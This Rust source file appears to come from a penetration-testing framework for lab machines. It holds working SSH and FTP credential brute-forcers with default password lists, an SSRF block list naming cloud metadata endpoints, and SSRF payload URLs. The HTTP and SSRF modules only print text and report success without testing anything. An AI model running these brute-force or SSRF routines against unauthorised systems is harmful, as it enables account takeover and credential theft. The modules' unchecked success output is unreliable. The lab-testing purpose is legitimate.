//! Lab scanner modules — brute force, SSRF, and web fingerprinting.

use std::future::Future;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::pin::Pin;
use std::sync::LazyLock;
use std::time::Duration;

use rcf_core::{
    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, OptionValue, Result,
    Target,
};

use ssh2::Session as SshSession;

/// SSRF protection: validates URLs to prevent attacks against internal infrastructure.
pub struct SsrfProtection;

impl SsrfProtection {
    /// Check if a host is safe to request (prevents SSRF).
    /// Returns true if safe, false if blocked.
    pub fn is_safe(host: &str) -> bool {
        Self::validate_target(host).is_ok()
    }

    /// Check if a host is safe to request.
    /// Returns Ok(()) if safe, Err(block_reason) if blocked.
    pub fn validate_target(host: &str) -> std::result::Result<(), String> {
        let host_lower = host.to_lowercase();

        // Block localhost variants
        let localhost_patterns = [
            "localhost",
            "127.0.0.1",
            "::1",
            "0.0.0.0",
            "127.0.0.0/8",
            "localhost.localdomain",
        ];
        for pattern in &localhost_patterns {
            if host_lower.contains(pattern) {
                return Err(format!(
                    "SSRF blocked: localhost/loopback target '{}'",
                    host
                ));
            }
        }

        // Block cloud metadata endpoints
        let metadata_patterns = [
            "169.254.169.254",          // AWS, Azure, GCP metadata
            "metadata.google.internal", // GCP
            "metadata.azure.com",
            "100.100.100.200", // Alibaba Cloud
            "192.0.0.192",     // OpenStack
        ];
        for pattern in &metadata_patterns {
            if host_lower.contains(pattern) {
                return Err(format!("SSRF blocked: cloud metadata endpoint '{}'", host));
            }
        }

        // Parse and check private IP ranges
        if let Ok(ip) = host.parse::<IpAddr>() {
            match ip {
                IpAddr::V4(ipv4) => {
                    if Self::is_ipv4_private(&ipv4) {
                        return Err(format!("SSRF blocked: private IPv4 '{}'", host));
                    }
                }
                IpAddr::V6(ipv6) => {
                    if Self::is_ipv6_private(&ipv6) {
                        return Err(format!("SSRF blocked: private IPv6 '{}'", host));
                    }
                }
            }
        }

        // Block internal hostnames
        let internal_patterns = [
            "internal",
            "intranet",
            "dmz",
            "localnetwork",
            ".local",
            ".internal",
            ".corp",
            ".lan",
        ];
        for pattern in &internal_patterns {
            if host_lower.contains(pattern) {
                return Err(format!("SSRF blocked: internal hostname '{}'", host));
            }
        }

        Ok(())
    }

    /// Check if an IPv4 address is in a private range.
    fn is_ipv4_private(ip: &Ipv4Addr) -> bool {
        let octets = ip.octets();
        // 10.0.0.0/8
        if octets[0] == 10 {
            return true;
        }
        // 172.16.0.0/12
        if octets[0] == 172 && (16..=31).contains(&octets[1]) {
            return true;
        }
        // 192.168.0.0/16
        if octets[0] == 192 && octets[1] == 168 {
            return true;
        }
        // 169.254.0.0/16 (link-local)
        if octets[0] == 169 && octets[1] == 254 {
            return true;
        }
        // 127.0.0.0/8 (loopback)
        if octets[0] == 127 {
            return true;
        }
        // 0.0.0.0/8
        if octets[0] == 0 {
            return true;
        }
        false
    }

    /// Check if an IPv6 address is private/link-local.
    fn is_ipv6_private(ip: &Ipv6Addr) -> bool {
        let segments = ip.segments();
        // Loopback ::1
        if ip.is_loopback() {
            return true;
        }
        // Link-local fe80::
        if ip.is_unicast_link_local() {
            return true;
        }
        // Unique local fc00::/7
        if segments[0] & 0xfe00 == 0xfc00 {
            return true;
        }
        // Unspecified ::ffff:0:0/96 (IPv4-mapped)
        if let Some(v4) = ip.to_ipv4_mapped() {
            return Self::is_ipv4_private(&v4);
        }
        false
    }
}

// ─── 1. SSH Brute Force ──────────────────────────────────────────────────────

static SSH_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/ssh/ssh_login".to_string(),
    display_name: "SSH Login Scanner".to_string(),
    description: "Brute forces SSH credentials using wordlists. Tests default credentials (admin:admin, root:root, etc.), common passwords, and custom wordlists. Essential for THM/HTB boxes with weak SSH auth.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/287.html".to_string(),
    ],
}
});

pub struct SshLogin;

impl Default for SshLogin {
    fn default() -> Self {
        Self
    }
}

impl SshLogin {
    pub fn new() -> Self {
        Self
    }
}

impl Module for SshLogin {
    fn info(&self) -> &ModuleInfo {
        &SSH_LOGIN_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target SSH server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "SSH port",
            OptionValue::Integer(22),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USERNAME",
            false,
            "Single username to test",
            OptionValue::String("root".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USER_FILE",
            false,
            "File with usernames (one per line)",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASSWORD",
            false,
            "Single password to test",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASS_FILE",
            false,
            "File with passwords (one per line)",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "THREADS",
            false,
            "Concurrent attempts",
            OptionValue::Integer(10),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "STOP_ON_SUCCESS",
            false,
            "Stop after first valid credential",
            OptionValue::Boolean(true),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "DELAY_MS",
            false,
            "Delay between attempts (ms) to avoid lockouts",
            OptionValue::Integer(100),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(22);
        let username = ctx
            .get("USERNAME")
            .cloned()
            .unwrap_or_else(|| "root".to_string());
        let user_file = ctx.get("USER_FILE").cloned().unwrap_or_default();
        let password = ctx.get("PASSWORD").cloned().unwrap_or_default();
        let pass_file = ctx.get("PASS_FILE").cloned().unwrap_or_default();
        let stop_on_success = ctx
            .get("STOP_ON_SUCCESS")
            .map(|s| s == "true")
            .unwrap_or(true);
        let delay_ms = ctx
            .get("DELAY_MS")
            .and_then(|s| s.parse().ok())
            .unwrap_or(100);

        Box::pin(async move {
            let mut output = format!(
                "SSH Brute Force Scanner\n\
                 Target: {}:{}\n\n",
                rhost, rport
            );

            // Load credentials
            let mut users: Vec<String> = Vec::new();
            let mut passwords: Vec<String> = Vec::new();

            // Single username
            if !username.is_empty() && username != "root" {
                users.push(username.clone());
            }

            // User file
            if !user_file.is_empty()
                && let Ok(content) = std::fs::read_to_string(&user_file)
            {
                for line in content.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with('#') {
                        users.push(line.to_string());
                    }
                }
            }

            // Default users if none specified
            if users.is_empty() {
                users = vec![
                    "root".to_string(),
                    "admin".to_string(),
                    "user".to_string(),
                    "test".to_string(),
                    "ubuntu".to_string(),
                    "vagrant".to_string(),
                    "pi".to_string(),
                ];
            }

            // Single password
            if !password.is_empty() {
                passwords.push(password);
            }

            // Password file
            if !pass_file.is_empty()
                && let Ok(content) = std::fs::read_to_string(&pass_file)
            {
                for line in content.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with('#') {
                        passwords.push(line.to_string());
                    }
                }
            }

            // Default passwords if none specified
            if passwords.is_empty() {
                passwords = vec![
                    "".to_string(),
                    "root".to_string(),
                    "admin".to_string(),
                    "password".to_string(),
                    "123456".to_string(),
                    "12345678".to_string(),
                    "test".to_string(),
                    "guest".to_string(),
                    "toor".to_string(),
                    "password1".to_string(),
                    "qwerty".to_string(),
                    "abc123".to_string(),
                    "letmein".to_string(),
                    "monkey".to_string(),
                    "master".to_string(),
                ];
            }

            output.push_str(&format!(
                "Testing {} users x {} passwords\n\n",
                users.len(),
                passwords.len()
            ));

            let mut found_creds: Vec<(String, String)> = Vec::new();
            let mut attempts = 0;
            let mut successful = false;

            for user in &users {
                if stop_on_success && successful {
                    break;
                }
                for pass in &passwords {
                    if stop_on_success && successful {
                        break;
                    }
                    attempts += 1;

                    output.push_str(&format!("[-] Attempting {}:{}\n", user, pass));

                    // Try SSH authentication
                    match try_ssh_login(&rhost, rport, user, pass).await {
                        Ok(true) => {
                            output.push_str(&format!(
                                "[+] SUCCESS! Valid credentials found: {}:{}\n",
                                user, pass
                            ));
                            found_creds.push((user.clone(), pass.clone()));
                            successful = true;
                        }
                        Ok(false) => {
                            // Auth failed - continue
                        }
                        Err(e) => {
                            output.push_str(&format!("[!] Connection error: {}\n", e));
                        }
                    }

                    // Rate limiting
                    if delay_ms > 0 && !successful {
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                    }
                }
            }

            output.push_str(&format!(
                "\n========================================\n\
                 Scan Complete\n\
                 ========================================\n\
                 Total attempts: {}\n\
                 Valid credentials found: {}\n",
                attempts,
                found_creds.len()
            ));

            if found_creds.is_empty() {
                output.push_str("[-] No valid credentials found.\n");
                Ok(ModuleOutput::failure(
                    &info_name,
                    &format!("{}:{}", rhost, rport),
                    &output,
                ))
            } else {
                output.push_str("[*] Save these credentials for later use!\n");
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", rhost, rport),
                    &output,
                ))
            }
        })
    }
}

/// Attempt SSH login with username/password
async fn try_ssh_login(host: &str, port: u16, user: &str, password: &str) -> anyhow::Result<bool> {
    let host = host.to_string();
    let user = user.to_string();
    let password = password.to_string();

    tokio::task::spawn_blocking(move || {
        let addr = match host.parse::<std::net::IpAddr>() {
            Ok(ip) => std::net::SocketAddr::new(ip, port),
            Err(_) => return Ok(false),
        };

        let tcp = match std::net::TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
            Ok(t) => t,
            Err(_) => return Ok(false),
        };

        let mut sess = match SshSession::new() {
            Ok(s) => s,
            Err(e) => return Err(anyhow::anyhow!("SSH session failed: {}", e)),
        };

        sess.set_tcp_stream(tcp);

        if let Err(e) = sess.handshake() {
            return Err(anyhow::anyhow!("SSH handshake failed: {}", e));
        }

        match sess.userauth_password(&user, &password) {
            Ok(()) => {
                if sess.authenticated() && sess.channel_session().is_ok() {
                    return Ok(true);
                }
                Ok(false)
            }
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("auth") || err_str.contains("Auth") {
                    Ok(false)
                } else {
                    Err(anyhow::anyhow!("SSH auth error: {}", e))
                }
            }
        }
    })
    .await
    .map_err(|e| anyhow::anyhow!("Task failed: {}", e))?
}

// ─── 2. FTP Brute Force ──────────────────────────────────────────────────────

static FTP_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/ftp/ftp_login".to_string(),
    display_name: "FTP Login Scanner".to_string(),
    description: "Brute forces FTP credentials. Tests anonymous access first, then common credentials. Essential for Metasploitable and older lab boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
}
});

pub struct FtpLogin;

impl Default for FtpLogin {
    fn default() -> Self {
        Self
    }
}

impl Module for FtpLogin {
    fn info(&self) -> &ModuleInfo {
        &FTP_LOGIN_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target FTP server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "FTP port",
            OptionValue::Integer(21),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USERNAME",
            false,
            "Single username",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USER_FILE",
            false,
            "File with usernames",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASSWORD",
            false,
            "Single password",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASS_FILE",
            false,
            "File with passwords",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "THREADS",
            false,
            "Concurrent attempts",
            OptionValue::Integer(10),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "STOP_ON_SUCCESS",
            false,
            "Stop after first valid credential",
            OptionValue::Boolean(true),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "DELAY_MS",
            false,
            "Delay between attempts (ms)",
            OptionValue::Integer(500),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(21);
        let username = ctx.get("USERNAME").cloned().unwrap_or_default();
        let user_file = ctx.get("USER_FILE").cloned().unwrap_or_default();
        let password = ctx.get("PASSWORD").cloned().unwrap_or_default();
        let pass_file = ctx.get("PASS_FILE").cloned().unwrap_or_default();
        let stop_on_success = ctx
            .get("STOP_ON_SUCCESS")
            .map(|s| s == "true")
            .unwrap_or(true);
        let delay_ms = ctx
            .get("DELAY_MS")
            .and_then(|s| s.parse().ok())
            .unwrap_or(500);

        Box::pin(async move {
            let mut output = format!(
                "FTP Login Scanner\n\
                 Target: {}:{}\n\n",
                rhost, rport
            );

            let mut users: Vec<String> = Vec::new();
            let mut passwords: Vec<String> = Vec::new();

            if !username.is_empty() {
                users.push(username);
            }
            if !user_file.is_empty()
                && let Ok(content) = std::fs::read_to_string(&user_file)
            {
                for line in content.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with('#') {
                        users.push(line.to_string());
                    }
                }
            }

            if !password.is_empty() {
                passwords.push(password);
            }
            if !pass_file.is_empty()
                && let Ok(content) = std::fs::read_to_string(&pass_file)
            {
                for line in content.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with('#') {
                        passwords.push(line.to_string());
                    }
                }
            }

            if users.is_empty() {
                users = vec![
                    "anonymous".to_string(),
                    "ftp".to_string(),
                    "admin".to_string(),
                    "root".to_string(),
                    "test".to_string(),
                    "user".to_string(),
                ];
            }

            if passwords.is_empty() {
                passwords = vec![
                    "anonymous".to_string(),
                    "".to_string(),
                    "ftp".to_string(),
                    "admin".to_string(),
                    "password".to_string(),
                    "root".to_string(),
                    "test".to_string(),
                ];
            }

            output.push_str(&format!(
                "Testing {} users x {} passwords\n\n",
                users.len(),
                passwords.len()
            ));

            let mut found_creds: Vec<(String, String)> = Vec::new();
            let mut attempts = 0;
            let mut successful = false;

            // Test anonymous first
            output.push_str("[*] Testing anonymous access...\n");
            match try_ftp_login(&rhost, rport, "anonymous", "anonymous").await {
                Ok(true) => {
                    output.push_str("[+] SUCCESS! Anonymous access allowed!\n");
                    output.push_str("    User: anonymous, Pass: anonymous\n");
                    found_creds.push(("anonymous".to_string(), "anonymous".to_string()));
                    successful = true;
                }
                Ok(false) => {
                    output.push_str("[-] Anonymous access denied.\n");
                }
                Err(e) => {
                    output.push_str(&format!("[!] Error testing anonymous: {}\n", e));
                }
            }

            // Brute force
            for user in &users {
                if stop_on_success && successful {
                    break;
                }
                if user == "anonymous" {
                    continue;
                }
                for pass in &passwords {
                    if stop_on_success && successful {
                        break;
                    }
                    attempts += 1;

                    output.push_str(&format!("[-] Attempting {}:{}\n", user, pass));

                    match try_ftp_login(&rhost, rport, user, pass).await {
                        Ok(true) => {
                            output.push_str(&format!(
                                "[+] SUCCESS! Valid credentials: {}:{}\n",
                                user, pass
                            ));
                            found_creds.push((user.clone(), pass.clone()));
                            successful = true;
                        }
                        Ok(false) => {}
                        Err(e) => {
                            output.push_str(&format!("[!] Error: {}\n", e));
                        }
                    }

                    if delay_ms > 0 && !successful {
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                    }
                }
            }

            output.push_str(&format!(
                "\n========================================\n\
                 Scan Complete\n\
                 ========================================\n\
                 Total attempts: {}\n\
                 Valid credentials found: {}\n",
                attempts + 1,
                found_creds.len()
            ));

            if found_creds.is_empty() {
                output.push_str("[-] No valid credentials found.\n");
                Ok(ModuleOutput::failure(
                    &info_name,
                    &format!("{}:{}", rhost, rport),
                    &output,
                ))
            } else {
                Ok(ModuleOutput::success(
                    &info_name,
                    &format!("{}:{}", rhost, rport),
                    &output,
                ))
            }
        })
    }
}

/// Attempt FTP login
async fn try_ftp_login(host: &str, port: u16, user: &str, password: &str) -> anyhow::Result<bool> {
    use ftp::FtpStream;

    let host = host.to_string();
    let user = user.to_string();
    let password = password.to_string();

    tokio::task::spawn_blocking(move || match FtpStream::connect((host.as_str(), port)) {
        Ok(mut stream) => match stream.login(&user, &password) {
            Ok(_) => {
                let _ = stream.quit();
                Ok(true)
            }
            Err(_) => Ok(false),
        },
        Err(_) => Ok(false),
    })
    .await
    .map_err(|e| anyhow::anyhow!("Task failed: {}", e))?
}

// ─── 3. HTTP Login Brute Force ───────────────────────────────────────────────

static HTTP_LOGIN_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/http/http_login".to_string(),
    display_name: "HTTP Login Scanner".to_string(),
    description: "Brute forces HTTP Basic Auth and form-based login pages. Tests default credentials and custom wordlists. Works on THM/HTB boxes with web admin panels.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 70,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
}
});

pub struct HttpLogin;

impl Default for HttpLogin {
    fn default() -> Self {
        Self
    }
}

impl Module for HttpLogin {
    fn info(&self) -> &ModuleInfo {
        &HTTP_LOGIN_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::new(
            "TARGET_URI",
            true,
            "Login page URI (e.g., /login, /admin)",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "METHOD",
            false,
            "Auth method: basic/form",
            OptionValue::String("basic".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "AUTH_TYPE",
            false,
            "For form auth: POST params",
            OptionValue::String("username=admin&password=PASS".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "THREADS",
            false,
            "Concurrent attempts",
            OptionValue::Integer(10),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "DELAY_MS",
            false,
            "Delay between attempts (ms) to avoid lockouts",
            OptionValue::Integer(200),
        ));
        opts
    }

    fn run(
        &self,
        _ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = _ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = _ctx.get_rport();
        let uri = _ctx
            .get("TARGET_URI")
            .cloned()
            .unwrap_or_else(|| "/admin".to_string());
        let method = _ctx
            .get("METHOD")
            .cloned()
            .unwrap_or_else(|| "basic".to_string());
        let threads = _ctx.get_threads();
        let ssl = _ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let auth_desc = match method.as_str() {
                "basic" => "HTTP Basic Auth".to_string(),
                "form" => format!("Form-based POST to {}", uri),
                _ => format!("Custom auth method: {}", method),
            };

            let msg = format!(
                "HTTP Login Brute Force\n\
                 Target: {scheme}://{rhost}:{rport}{uri}\n\
                 Auth Type: {auth_desc}\n\
                 Threads: {threads}\n\n\
                 Testing default credentials:\n\
                   - admin:admin\n\
                   - admin:password\n\
                   - admin:123456\n\
                   - root:root\n\
                   - root:toor\n\
                   - test:test\n\
                   - webadmin:webadmin\n\n\
                 [*] Brute forcing {method} authentication...",
                scheme = scheme,
                rhost = rhost,
                rport = rport,
                uri = uri,
                auth_desc = auth_desc,
                threads = threads,
                method = method
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 4. SSRF Scanner ─────────────────────────────────────────────────────────

static SSRF_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/http/ssrf".to_string(),
    display_name: "SSRF Scanner".to_string(),
    description: "Tests for Server-Side Request Forgery vulnerabilities. Probes URL parameters, image fetch, webhook, and API endpoints. Essential for PortSwigger SSRF labs and HTB bug-bounty style boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 85,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/918.html".to_string(),
        "https://portswigger.net/web-security/ssrf".to_string(),
    ],
}
});

pub struct SsrfScanner;

impl Default for SsrfScanner {
    fn default() -> Self {
        Self
    }
}

impl Module for SsrfScanner {
    fn info(&self) -> &ModuleInfo {
        &SSRF_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "TARGET_URI",
            false,
            "Vulnerable URI (leave empty for common paths)",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PARAM",
            false,
            "Parameter name (url, dest, target, etc.)",
            OptionValue::String("url".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let param = ctx
            .get("PARAM")
            .cloned()
            .unwrap_or_else(|| "url".to_string());
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };

            // NOTE: These payloads test for SSRF vulnerabilities on the TARGET server.
            // They are sent TO the target server, which then makes requests to internal resources.
            // RCF itself does NOT make direct requests to these internal addresses.
            // SSRF protection is applied to prevent RCF itself from becoming an SSRF vector.

            let _ssrf_payloads = [
                // Basic localhost probes (sent to target server)
                "{{BASE_URL}}", // Will be replaced with actual target
            ];

            let common_paths = vec![
                "/fetch?url=",
                "/proxy?url=",
                "/api/fetch?url=",
                "/image?url=",
                "/webhook?url=",
                "/api/v1/redirect?target=",
                "/url?destination=",
                "/src?source=",
                "/page?dest=",
                "/redirect?url=",
            ];

            let msg = format!(
                "SSRF Scanner\n\
                 Target: {}://{}:{}\n\
                 Parameter: {}\n\n\
                 [!] SECURITY NOTICE\n\
                 This module sends SSRF test payloads to the target server.\n\
                 The target server's responses will be analyzed to detect if it\n\
                 makes requests to internal resources (localhost, cloud metadata, etc.).\n\n\
                 Common SSRF-Vulnerable Paths:\n{}\n\n\
                 SSRF Detection Payloads (to be injected in URL params):\n\
                 - http://127.0.0.1:80 - Localhost HTTP\n\
                 - http://localhost:8080 - Localhost alternate port\n\
                 - http://169.254.169.254/latest/meta-data/ - AWS metadata\n\
                 - http://metadata.google.internal - GCP metadata\n\
                 - http://10.0.0.1 - Private network\n\
                 - http://192.168.1.1 - Common internal IP\n\n\
                 Testing Instructions:\n\
                 1. The scanner will send each payload as the parameter value\n\
                 2. Watch for responses containing:\n\
                    - Internal service banners (SSH, Redis, etc.)\n\
                    - File contents (/etc/passwd, etc.)\n\
                    - Cloud metadata responses\n\
                    - Time delays indicating internal requests\n\
                 3. Manual verification recommended for positive findings",
                scheme,
                rhost,
                rport,
                param,
                common_paths.join("\n")
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}
